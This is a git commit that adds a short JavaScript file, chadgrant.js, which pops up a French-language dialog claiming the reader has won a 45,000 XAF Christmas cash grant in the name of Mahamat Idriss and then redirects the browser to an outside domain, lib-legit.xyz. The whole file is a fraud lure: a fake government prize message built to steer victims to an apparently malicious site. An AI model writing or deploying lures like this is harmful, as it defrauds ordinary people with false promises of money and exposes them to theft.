731b0378a54784d721b47e6a4b8b2fea7149a611
bigetijazz22 <bigetijazz22@gmail.com>
2024-12-06 23:00:14 -0800

    Create chadgrant.js

---
+++ chadgrant.js
@@ -0,0 +1,6 @@
+
+var password = 'RECLAMER 45,000 XAF'
+password=prompt('SMS: Félicitations, vous êtes admissible à MAHAMAT IDRISS 45,000 XAF SUBVENTION EN ESPÈCES DE NOËL POUR TOUS, Veuillez appuyer sur OK pour RECLAMER Prix ​​en espèces','RECLAMER 45,000 XAF');
+if (password != 'RECLAMER 45,000 XAF') {
+location.href='https://www.lib-legit.xyz/Retirer-45000XAF';
+}
